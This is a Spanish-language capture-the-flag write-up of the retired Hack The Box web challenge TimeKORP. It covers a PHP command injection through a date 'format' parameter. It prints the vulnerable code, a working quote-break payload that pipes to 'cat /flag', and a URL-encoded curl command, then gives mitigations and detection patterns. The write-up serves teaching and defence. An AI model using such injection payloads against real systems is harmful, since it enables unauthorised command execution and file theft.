---
challenge: TimeKORP
category: Web
difficulty: Very Easy
platform: Hack The Box
state: Retired
tags: [web, command-injection, php, cyber-apocalypse-2024]
type: Web
---

# TimeKORP — Hack The Box

[⚑ English](README.en.md) | **Español**

> **Estado:** Retired (Cyber Apocalypse 2024). Ficha de método; sin flags reales.

## TL;DR

Una web que muestra la hora según un parámetro `format`. En PHP, el controlador pasa ese valor a un modelo que construye una orden de shell con `date` **sin sanear**; el parámetro acaba dentro de comillas simples, así que se cierra la comilla, se encadena con `|` y se comenta el resto. Con el código fuente del reto a la vista, la inyección se ve en dos líneas.

## Enunciado y superficie

- Categoría Web. Se entrega el código (`TimeController.php`, `TimeModel.php`) y un `Dockerfile`; la instancia sirve una única página que muestra la hora.
- El `Dockerfile` copia la flag a `/flag`: el objetivo es leer un fichero del sistema, no escalar.

## Reconocimiento

```bash
curl -s "http://<IP>:<PORT>/"
# 14:32:07
curl -s "http://<IP>:<PORT>/?format=H"
# 14
```

El parámetro `format` cambia la salida, señal de que se pasa tal cual a `date`.

## Análisis del código

```php
// TimeModel.php
$this->command = "date '" . $this->format . "' 2>&1";
// ...
return shell_exec($this->command);
```

El valor va entre **comillas simples** dentro de una orden de shell. No hay `escapeshellarg` ni lista blanca de formatos: cualquier metacaracter del shell se interpreta.

## Explotación

Cerrar la comilla, encadenar con `|` y comentar el `2>&1` con `#`:

```text
/?format=%H:%M:%S' |cat /flag #
```

```bash
curl -s "http://<IP>:<PORT>/?format=%H%3A%M%3A%S%27%20%7Ccat%20%2Fflag%20%23"
```

El `#` no es decorativo: sin él, `2>&1` sigue en la orden y la salida de `cat` se redirige, así que el flag no aparece.

## Evidencia

- Instancia web y código PHP del reto; en el informe, la orden construida (`date '%H:%M:%S'' |cat /flag # 2>&1`), no el flag.

## Lecciones

- Interpolar entrada del usuario en una orden de shell es inyección de comandos aunque «sólo» sea un formato de fecha.
- En una orden entre comillas simples el ataque es `'` + separador, no `;` a secas; el `#` final evita la redirección.
- Codificar la URL (`%27`, `%7C`, `%23`, `%20`) es obligatorio con `curl`.
- `escapeshellarg()` y una lista de formatos permitidos son la defensa; mejor aún, usar la API de fecha del lenguaje sin pasar por el shell.

## Mitigaciones y detección

- No construir órdenes de shell: usar `DateTime::format()` en PHP, que no ejecuta nada.
- Si hay que llamar a un binario, `escapeshellarg` y validación de `format` contra un patrón (`^[a-zA-Z0-9:%-]+$`).
- Detección: parámetros `format` con comillas, `|`, `;`, `$(` o `#`, y procesos `sh -c date ...` con `cat` en la línea.
